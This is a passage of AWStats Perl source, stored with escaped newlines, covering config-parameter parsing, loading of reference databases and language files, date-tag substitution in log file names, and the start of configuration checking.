/^(.*)$/i, <DATAFILE> );\n\t\t\t\t\tpush @HostAliases, map { qr/^$_$/i } @val;\n\t\t\t\t\tclose(DATAFILE);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\t\tif ($elem) { push @HostAliases, qr/$elem/i; }\n\t\t\t\t}\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n\t\t# Special optional setup params\n\t\tif ( $param =~ /^SkipDNSLookupFor/ ) {\n\t\t\t@SkipDNSLookupFor = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipDNSLookupFor, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^AllowAccessFromWebToFollowingAuthenticatedUsers/ ) {\n\t\t\t@AllowAccessFromWebToFollowingAuthenticatedUsers = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) {\n\t\t\t\tpush @AllowAccessFromWebToFollowingAuthenticatedUsers, $_;\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^DefaultFile/ ) {\n\t\t\t@DefaultFile = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\n\t\t\t\t# No REGEX for this option\n\t\t\t\t#if ($elem =~ /^REGEX\\[(.*)\\]$/i) { $elem=$1; }\n\t\t\t\t#else { $elem='^'.quotemeta($elem).'$'; }\n\t\t\t\tif ($elem) { push @DefaultFile, $elem; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SkipHosts/ ) {\n\t\t\t@SkipHosts = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipHosts, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SkipReferrersBlackList/ && $value ) {\n\t\t\topen( BLACKLIST, \"<$value\" )\n\t\t\t  || die \"Failed to open blacklist: $!\\n\";\n\t\t\twhile (<BLACKLIST>) {\n\t\t\t\tchomp;\n\t\t\t\tmy $elem = $_;\n\t\t\t\t$elem =~ s/ //;\n\t\t\t\t$elem =~ s/\\#.*//;\n\t\t\t\tif ($elem) { push @SkipReferrers, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t\tclose(BLACKLIST);\n\t\t}\n\t\tif ( $param =~ /^SkipUserAgents/ ) {\n\t\t\t@SkipUserAgents = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipUserAgents, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SkipFiles/ ) {\n\t\t\t@SkipFiles = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipFiles, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyHosts/ ) {\n\t\t\t@OnlyHosts = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyHosts, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyUsers/ ) {\n\t\t\t@OnlyUsers = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyUsers, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyUserAgents/ ) {\n\t\t\t@OnlyUserAgents = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyUserAgents, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyFiles/ ) {\n\t\t\t@OnlyFiles = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyFiles, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^NotPageFiles/ ) {\n\t\t\t@NotPageFiles = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @NotPageFiles, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^NotPageList/ ) {\n\t\t\t%NotPageList = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $NotPageList{$_} = 1; }\n\t\t\t$FoundNotPageList = 1;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ValidHTTPCodes/ ) {\n\t\t\t%ValidHTTPCodes = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $ValidHTTPCodes{$_} = 1; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ValidSMTPCodes/ ) {\n\t\t\t%ValidSMTPCodes = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $ValidSMTPCodes{$_} = 1; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^TrapInfosForHTTPErrorCodes/ ) {\n\t\t\t%TrapInfosForHTTPErrorCodes = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $TrapInfosForHTTPErrorCodes{$_} = 1; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^URLWithQueryWithOnlyFollowingParameters$/ ) {\n\t\t\t@URLWithQueryWithOnly = split( /\\s+/, $value );\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^URLWithQueryWithoutFollowingParameters$/ ) {\n\t\t\t@URLWithQueryWithout = split( /\\s+/, $value );\n\t\t\tnext;\n\t\t}\n\n\t\t# Extra parameters\n\t\tif ( $param =~ /^ExtraSectionName(\\d+)/ ) {\n\t\t\t$ExtraName[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionCodeFilter(\\d+)/ ) {\n\t\t\t@{ $ExtraCodeFilter[$1] } = split( /\\s+/, $value );\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionCondition(\\d+)/ ) {\n\t\t\t$ExtraCondition[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionStatTypes(\\d+)/ ) {\n\t\t\t$ExtraStatTypes[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnTitle(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnTitle[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnValues(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnValues[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnFunction(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnFunction[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionFirstColumnFormat(\\d+)/ ) {\n\t\t\t$ExtraFirstColumnFormat[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionAddAverageRow(\\d+)/ ) {\n\t\t\t$ExtraAddAverageRow[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ExtraSectionAddSumRow(\\d+)/ ) {\n\t\t\t$ExtraAddSumRow[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^MaxNbOfExtra(\\d+)/ ) {\n\t\t\t$MaxNbOfExtra[$1] = $value;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^MinHitExtra(\\d+)/ ) {\n\t\t\t$MinHitExtra[$1] = $value;\n\t\t\tnext;\n\t\t}\n\n\t\t# Plugins\n\t\tif ( $param =~ /^LoadPlugin/ ) {\n\t\t\t$value =~ s/[^a-zA-Z0-9_\\/\\.\\+:=\\?\\s%\\-]//g;\t\t# Sanitize plugin name and string param because it is used later in an eval.\n\t\t\tpush @PluginsToLoad, $value; next; \n\t\t}\n\n\t  # Other parameter checks we need to put after MaxNbOfExtra and MinHitExtra\n\t\tif ( $param =~ /^MaxNbOf(\\w+)/ ) { $MaxNbOf{$1} = $value; next; }\n\t\tif ( $param =~ /^MinHit(\\w+)/ )  { $MinHit{$1}  = $value; next; }\n\n# Check if this is a known parameter\n#\t\tif (! $ConfOk{$param}) { error(\"Unknown config parameter '$param' found line $conflinenb in file \\\"configFile\\\"\"); }\n# If parameters was not found previously, defined variable with name of param to value\n\t\t$$param = $value;\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\"Config file read was \\\"$configFile\\\" (level $level)\");\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Load the reference databases\n# Parameters:\tList of files to load\n# Input:\t\t$DIR\n# Output:\t\tArrays and Hash tables are defined\n# Return:       -\n#------------------------------------------------------------------------------\nsub Read_Ref_Data {\n\n# Check lib files in common possible directories :\n# Windows and standard package:        \t\t\"$DIR/lib\" (lib in same dir than awstats.pl)\n# Debian package:                    \t\t\"/usr/share/awstats/lib\"\n\tmy @PossibleLibDir = ( \"$DIR/lib\", \"/usr/share/awstats/lib\" );\n\tmy %FilePath       = ();\n\tmy %DirAddedInINC  = ();\n\tmy @FileListToLoad = ();\n\twhile ( my $file = shift ) { push @FileListToLoad, \"$file.pm\"; }\n\tif ($Debug) {\n\t\tdebug( \"Call to Read_Ref_Data with files to load: \"\n\t\t\t  . ( join( ',', @FileListToLoad ) ) );\n\t}\n\tforeach my $file (@FileListToLoad) {\n\t\tforeach my $dir (@PossibleLibDir) {\n\t\t\tmy $searchdir = $dir;\n\t\t\tif (   $searchdir\n\t\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t\t{\n\t\t\t\t$searchdir .= \"/\";\n\t\t\t}\n\t\t\tif ( !$FilePath{$file} )\n\t\t\t{    # To not load twice same file in different path\n\t\t\t\tif ( -s \"${searchdir}${file}\" ) {\n\t\t\t\t\t$FilePath{$file} = \"${searchdir}${file}\";\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"Call to Read_Ref_Data [FilePath{$file}=\\\"$FilePath{$file}\\\"]\"\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\n\t\t\t\t\t# Note: cygwin perl 5.8 need a push + require file\n\t\t\t\t\tif ( !$DirAddedInINC{\"$dir\"} ) {\n\t\t\t\t\t\tpush @INC, \"$dir\";\n\t\t\t\t\t\t$DirAddedInINC{\"$dir\"} = 1;\n\t\t\t\t\t}\n\t\t\t\t\tmy $loadret = require \"$file\";\n\n\t\t\t\t   #my $loadret=(require \"$FilePath{$file}\"||require \"${file}\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ( !$FilePath{$file} ) {\n\t\t\tmy $filetext = $file;\n\t\t\t$filetext =~ s/\\.pm$//;\n\t\t\t$filetext =~ s/_/ /g;\n\t\t\twarning(\n\"Warning: Can't read file \\\"$file\\\" ($filetext detection will not work correctly).\\nCheck if file is in \\\"\"\n\t\t\t\t  . ( $PossibleLibDir[0] )\n\t\t\t\t  . \"\\\" directory and is readable.\" );\n\t\t}\n\t}\n\n\t# Sanity check (if loaded)\n\tif ( ( scalar keys %OSHashID )\n\t\t&& @OSSearchIDOrder != scalar keys %OSHashID )\n\t{\n\t\terror(  \"Not same number of records of OSSearchIDOrder (\"\n\t\t\t  . (@OSSearchIDOrder)\n\t\t\t  . \" entries) and OSHashID (\"\n\t\t\t  . ( scalar keys %OSHashID )\n\t\t\t  . \" entries) in OS database. Check your file \"\n\t\t\t  . $FilePath{\"operating_systems.pm\"} );\n\t}\n\tif (\n\t\t( scalar keys %SearchEnginesHashID )\n\t\t&& ( @SearchEnginesSearchIDOrder_list1 +\n\t\t\t@SearchEnginesSearchIDOrder_list2 +\n\t\t\t@SearchEnginesSearchIDOrder_listgen ) != scalar\n\t\tkeys %SearchEnginesHashID\n\t  )\n\t{\n\t\terror(\n\"Not same number of records of SearchEnginesSearchIDOrder_listx (total is \"\n\t\t\t  . (\n\t\t\t\t@SearchEnginesSearchIDOrder_list1 +\n\t\t\t\t  @SearchEnginesSearchIDOrder_list2 +\n\t\t\t\t  @SearchEnginesSearchIDOrder_listgen\n\t\t\t  )\n\t\t\t  . \" entries) and SearchEnginesHashID (\"\n\t\t\t  . ( scalar keys %SearchEnginesHashID )\n\t\t\t  . \" entries) in Search Engines database. Check your file \"\n\t\t\t  . $FilePath{\"search_engines.pm\"}\n\t\t\t  . \" is up to date.\"\n\t\t);\n\t}\n\tif ( ( scalar keys %BrowsersHashIDLib )\n\t\t&& @BrowsersSearchIDOrder != ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )\n\t{\n\t\t#foreach (sort keys %BrowsersHashIDLib)\n\t\t#{\n\t\t#\tprint $_.\"\\n\";\n\t\t#}\n\t\t#foreach (sort @BrowsersSearchIDOrder)\n\t\t#{\n\t\t#\tprint $_.\"\\n\";\n\t\t#}\n\t\terror(  \"Not same number of records of BrowsersSearchIDOrder (\"\n\t\t\t  . (@BrowsersSearchIDOrder)\n\t\t\t  . \" entries) and BrowsersHashIDLib (\"\n\t\t\t  . ( ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )\n\t\t\t  . \" entries without firefox,opera,chrome,safari,konqueror,svn,msie,netscape,edge) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file \"\n\t\t\t  . $FilePath{\"browsers.pm\"}\n\t\t\t  . \" is up to date.\" );\n\t}\n\tif (\n\t\t( scalar keys %RobotsHashIDLib )\n\t\t&& ( @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +\n\t\t\t@RobotsSearchIDOrder_listgen ) !=\n\t\t( scalar keys %RobotsHashIDLib ) - 1\n\t  )\n\t{\n\t\terror(\n\t\t\t\"Not same number of records of RobotsSearchIDOrder_listx (total is \"\n\t\t\t  . (\n\t\t\t\t@RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +\n\t\t\t\t  @RobotsSearchIDOrder_listgen\n\t\t\t  )\n\t\t\t  . \" entries) and RobotsHashIDLib (\"\n\t\t\t  . ( ( scalar keys %RobotsHashIDLib ) - 1 )\n\t\t\t  . \" entries without 'unknown') in Robots database. Check your file \"\n\t\t\t  . $FilePath{\"robots.pm\"}\n\t\t\t  . \" is up to date.\"\n\t\t);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Get the messages for a specified language\n# Parameters:\tLanguageId\n# Input:\t\t$DirLang $DIR\n# Output:\t\t$Message table is defined in memory\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Read_Language_Data {\n\n\t# Check lang files in common possible directories :\n\t# Windows and standard package:         \t\"$DIR/lang\" (lang in same dir than awstats.pl)\n\t# Debian package :                    \t\t\"/usr/share/awstats/lang\"\n\tmy @PossibleLangDir =\n\t  ( \"$DirLang\", \"$DIR/lang\", \"/usr/share/awstats/lang\" );\n\n\tmy $FileLang = '';\n\tforeach (@PossibleLangDir) {\n\t\tmy $searchdir = $_;\n\t\tif ( $searchdir =~ /\\|/ )\t\t# We refuse path that contains \"|\" \n\t\t{\n\t\t\terror(\"DirLang parameter can't contains character |\");\n\t\t\tnext;\t\n\t\t}\n\t\tif ( $searchdir\n\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t{\n\t\t\t$searchdir .= \"/\";\n\t\t}\n\t\tif ( open( LANG, \"${searchdir}awstats-$_[0].txt\" ) ) {\n\t\t\t$FileLang = \"${searchdir}awstats-$_[0].txt\";\n\t\t\tlast;\n\t\t}\n\t}\n\n\t# If file not found, we try english\n\tif ( !$FileLang ) {\n\t\tforeach (@PossibleLangDir) {\n\t\t\tmy $searchdir = $_;\n\t\t\tif (   $searchdir\n\t\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t\t{\n\t\t\t\t$searchdir .= \"/\";\n\t\t\t}\n\t\t\tif ( open( LANG, \"${searchdir}awstats-en.txt\" ) ) {\n\t\t\t\t$FileLang = \"${searchdir}awstats-en.txt\";\n\t\t\t\tlast;\n\t\t\t}\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\"Call to Read_Language_Data [FileLang=\\\"$FileLang\\\"]\");\n\t}\n\tif ($FileLang) {\n\t\tmy $i = 0;\n\t\tbinmode LANG;    # Might avoid 'Malformed UTF-8 errors'\n\t\tmy $cregcode    = qr/^PageCode=[\\t\\s\\\"\\']*([\\w-]+)/i;\n\t\tmy $cregdir     = qr/^PageDir=[\\t\\s\\\"\\']*([\\w-]+)/i;\n\t\tmy $cregmessage = qr/^Message\\d+=/i;\n\t\twhile (<LANG>) {\n\t\t\tchomp $_;\n\t\t\ts/\\r//;\n\t\t\tif ( $_ =~ /$cregcode/o ) { $PageCode = $1; }\n\t\t\tif ( $_ =~ /$cregdir/o )  { $PageDir  = $1; }\n\t\t\tif ( $_ =~ s/$cregmessage//o ) {\n\t\t\t\t$_ =~ s/^#.*//;       # Remove comments\n\t\t\t\t$_ =~ s/\\s+#.*//;     # Remove comments\n\t\t\t\t$_ =~ tr/\\t /  /s;    # Change all blanks into \" \"\n\t\t\t\t$_ =~ s/^\\s+//;\n\t\t\t\t$_ =~ s/\\s+$//;\n\t\t\t\t$_ =~ s/^\\\"//;\n\t\t\t\t$_ =~ s/\\\"$//;\n\t\t\t\t$Message[$i] = $_;\n\t\t\t\t$i++;\n\t\t\t}\n\t\t}\n\t\tclose(LANG);\n\t}\n\telse {\n\t\twarning(\n\"Warning: Can't find language files for \\\"$_[0]\\\". English will be used.\"\n\t\t);\n\t}\n\n\t# Some language string changes\n\tif ( $LogType eq 'M' ) {    # For mail\n\t\t$Message[8]  = $Message[151];\n\t\t$Message[9]  = $Message[152];\n\t\t$Message[57] = $Message[149];\n\t\t$Message[75] = $Message[150];\n\t}\n\tif ( $LogType eq 'F' ) {    # For web\n\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Substitute date tags in a string by value\n# Parameters:\tString\n# Input:\t\tAll global variables\n# Output:\t\tChange on some global variables\n# Return:\t\tString\n#------------------------------------------------------------------------------\nsub Substitute_Tags {\n\tmy $SourceString = shift;\n\tif ($Debug) { debug(\"Call to Substitute_Tags on $SourceString\"); }\n\n\tmy %MonthNumLibEn = (\n\t\t\"01\", \"Jan\", \"02\", \"Feb\", \"03\", \"Mar\", \"04\", \"Apr\",\n\t\t\"05\", \"May\", \"06\", \"Jun\", \"07\", \"Jul\", \"08\", \"Aug\",\n\t\t\"09\", \"Sep\", \"10\", \"Oct\", \"11\", \"Nov\", \"12\", \"Dec\"\n\t);\n\n\twhile ( $SourceString =~ /%([ymdhwYMDHWNSO]+)-(\\(\\d+\\)|\\d+)/ ) {\n\n\t\t# Accept tag %xx-dd and %xx-(dd)\n\t\tmy $timetag     = \"$1\";\n\t\tmy $timephase   = quotemeta(\"$2\");\n\t\tmy $timephasenb = \"$2\";\n\t\t$timephasenb =~ s/[^\\d]//g;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Found a time tag '$timetag' with a phase of '$timephasenb' hour in log file name\",\n\t\t\t\t1\n\t\t\t);\n\t\t}\n\n\t\t# Get older time\n\t\tmy (\n\t\t\t$oldersec,   $oldermin,  $olderhour, $olderday,\n\t\t\t$oldermonth, $olderyear, $olderwday, $olderyday\n\t\t  )\n\t\t  = localtime( $starttime - ( $timephasenb * 3600 ) );\n\t\tmy $olderweekofmonth = int( $olderday / 7 );\n\t\tmy $olderweekofyear  =\n\t\t  int(\n\t\t\t( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /\n\t\t\t  7 ) + 1;\n\t\tif ( $olderweekofyear > 53 ) { $olderweekofyear = 1; }\n\t\tmy $olderdaymod = $olderday % 7;\n\t\t$olderwday++;\n\t\tmy $olderns =\n\t\t  Time::Local::timegm( 0, 0, 0, $olderday, $oldermonth, $olderyear );\n\n\t\tif ( $olderdaymod <= $olderwday ) {\n\t\t\tif ( ( $olderwday != 7 ) || ( $olderdaymod != 0 ) ) {\n\t\t\t\t$olderweekofmonth = $olderweekofmonth + 1;\n\t\t\t}\n\t\t}\n\t\tif ( $olderdaymod > $olderwday ) {\n\t\t\t$olderweekofmonth = $olderweekofmonth + 2;\n\t\t}\n\n\t\t# Change format of time variables\n\t\t$olderweekofmonth = \"0$olderweekofmonth\";\n\t\tif ( $olderweekofyear < 10 ) { $olderweekofyear = \"0$olderweekofyear\"; }\n\t\tif ( $olderyear < 100 ) { $olderyear += 2000; }\n\t\telse { $olderyear += 1900; }\n\t\tmy $oldersmallyear = $olderyear;\n\t\t$oldersmallyear =~ s/^..//;\n\t\tif ( ++$oldermonth < 10 ) { $oldermonth = \"0$oldermonth\"; }\n\t\tif ( $olderday < 10 )     { $olderday   = \"0$olderday\"; }\n\t\tif ( $olderhour < 10 )    { $olderhour  = \"0$olderhour\"; }\n\t\tif ( $oldermin < 10 )     { $oldermin   = \"0$oldermin\"; }\n\t\tif ( $oldersec < 10 )     { $oldersec   = \"0$oldersec\"; }\n\n\t\t# Replace tag with new value\n\t\tif ( $timetag eq 'YYYY' ) {\n\t\t\t$SourceString =~ s/%YYYY-$timephase/$olderyear/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'YY' ) {\n\t\t\t$SourceString =~ s/%YY-$timephase/$oldersmallyear/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'MM' ) {\n\t\t\t$SourceString =~ s/%MM-$timephase/$oldermonth/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'MO' ) {\n\t\t\t$SourceString =~ s/%MO-$timephase/$MonthNumLibEn{$oldermonth}/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'DD' ) {\n\t\t\t$SourceString =~ s/%DD-$timephase/$olderday/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'HH' ) {\n\t\t\t$SourceString =~ s/%HH-$timephase/$olderhour/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'NS' ) {\n\t\t\t$SourceString =~ s/%NS-$timephase/$olderns/ig;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'WM' ) {\n\t\t\t$SourceString =~ s/%WM-$timephase/$olderweekofmonth/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'Wm' ) {\n\t\t\tmy $olderweekofmonth0 = $olderweekofmonth - 1;\n\t\t\t$SourceString =~ s/%Wm-$timephase/$olderweekofmonth0/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'WY' ) {\n\t\t\t$SourceString =~ s/%WY-$timephase/$olderweekofyear/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'Wy' ) {\n\t\t\tmy $olderweekofyear0 = sprintf( \"%02d\", $olderweekofyear - 1 );\n\t\t\t$SourceString =~ s/%Wy-$timephase/$olderweekofyear0/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'DW' ) {\n\t\t\t$SourceString =~ s/%DW-$timephase/$olderwday/g;\n\t\t\tnext;\n\t\t}\n\t\tif ( $timetag eq 'Dw' ) {\n\t\t\tmy $olderwday0 = $olderwday - 1;\n\t\t\t$SourceString =~ s/%Dw-$timephase/$olderwday0/g;\n\t\t\tnext;\n\t\t}\n\n\t\t# If unknown tag\n\t\terror(\"Unknown tag '\\%$timetag' in parameter.\");\n\t}\n\n# Replace %YYYY %YY %MM %DD %HH with current value. Kept for backward compatibility.\n\t$SourceString =~ s/%YYYY/$nowyear/ig;\n\t$SourceString =~ s/%YY/$nowsmallyear/ig;\n\t$SourceString =~ s/%MM/$nowmonth/ig;\n\t$SourceString =~ s/%MO/$MonthNumLibEn{$nowmonth}/ig;\n\t$SourceString =~ s/%DD/$nowday/ig;\n\t$SourceString =~ s/%HH/$nowhour/ig;\n\t$SourceString =~ s/%NS/$nowns/ig;\n\t$SourceString =~ s/%WM/$nowweekofmonth/g;\n\tmy $nowweekofmonth0 = $nowweekofmonth - 1;\n\t$SourceString =~ s/%Wm/$nowweekofmonth0/g;\n\t$SourceString =~ s/%WY/$nowweekofyear/g;\n\tmy $nowweekofyear0 = $nowweekofyear - 1;\n\t$SourceString =~ s/%Wy/$nowweekofyear0/g;\n\t$SourceString =~ s/%DW/$nowwday/g;\n\tmy $nowwday0 = $nowwday - 1;\n\t$SourceString =~ s/%Dw/$nowwday0/g;\n\n\treturn $SourceString;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if all parameters are correctly defined. If not set them to default.\n# Parameters:\tNone\n# Input:\t\tAll global variables\n# Output:\t\tChange on some global variables\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Check_Config {\n\tif ($Debug) { debug(\"Call to Check_Config\"); }\n\n\t# Show initial values of main parameters before check\n\tif ($Debug) {\n\t\tdebug( \" LogFile='$LogFile'\",           2 );\n\t\tdebug( \" LogType='$LogType'\",           2 );\n\t\tdebug( \" LogFormat='$LogFormat'\",       2 );\n\t\tdebug( \" LogSeparator='$LogSeparator'\", 2 );\n\t\tdebug( \" DNSLookup='$DNSLookup'\",       2 );\n\t\tdebug( \" DirData='$DirData'\",           2 );\n\t\tdebug( \" DirCgi='$DirCgi'\",             2 );\n\t\tdebug( \" DirIcons='$DirIcons'\",         2 );\n\t\tdebug( \" NotPageList \" .    ( join( ',', keys %NotPageList ) ),    2 );\n\t\tdebug( \" ValidHTTPCodes \" . ( join( ',', keys %ValidHTTPCodes ) ), 2 );\n\t\tdebug( \" ValidSMTPCodes \" . ( join( ',', keys %ValidSMTPCodes ) ), 2 );\n\t\tdebug( \" UseFramesWhenCGI=$UseFramesWhenCGI\",     2 );\n\t\tdebug( \" BuildReportFormat=$BuildReportFormat\",   2 );\n\t\tdebug( \" BuildHistoryFormat=$BuildHistoryFormat\", 2 );\n\t\tdebug(\n\t\t\t\" URLWithQueryWithOnlyFollowingParameters=\"\n\t\t\t  . ( join( ',', @URLWithQueryWithOnly ) ),\n\t\t\t2\n\t\t);\n\t\tdebug(\n\t\t\t\" URLWithQueryWithoutFollowingParameters=\"\n\t\t\t  . ( join( ',', @URLWithQueryWithout ) ),\n\t\t\t2\n\t\t);\n\t}\n\n\t# Main section\n\t$LogFile = &Substitute_Tags($LogFile);\n\tif ( !$LogFile ) {\n\t\terror(\"LogFile parameter is not defined in config/domain file\");\n\t}\n\tif ( $LogType !~ /[WSMF]/i ) { $LogType = 'W'; }\n\t$LogFormat =~ s/\\\\//g;\n\tif ( !$LogFormat ) {\n\t\terror(\"LogFormat parameter is not defined in config/domain file\");\n\t}\n\tif ( $LogFormat =~ /^\\d$/ && $LogFormat !~ /[1-6]/ ) {\n\t\terror(\n\"LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')\"\n\t\t);\n\t}\n\t$LogSeparator ||= \"\\\\s\";\n\t$DirData      ||= '.';\n\t$DirCgi       ||= '/cgi-bin';\n\t$DirIcons     ||= '/icon';\n\tif ( $DNSLookup !~ /[0-2]/ ) {\n\t\terror(\n\"DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)\"\n\t\t);\n\t}\n\tif ( !$SiteDomain ) {\n\t\terror(\n\"SiteDomain parameter not defined in your config/domain file. You must edit it for using this version of AWStats.\"\n\t\t);\n\t}\n\tif ( $AllowToUpdateStatsFromBrowser !~ /[0-1]/ ) {\n\t\t$AllowToUpdateStatsFromBrowser = 0;\n\t}\n\tif ( $AllowFullYearView !~ /[0-3]/ ) { $AllowFullYearView = 2; }\n\n\t# Optional setup section\n\tif ( !$SectionsToBeSaved )             { 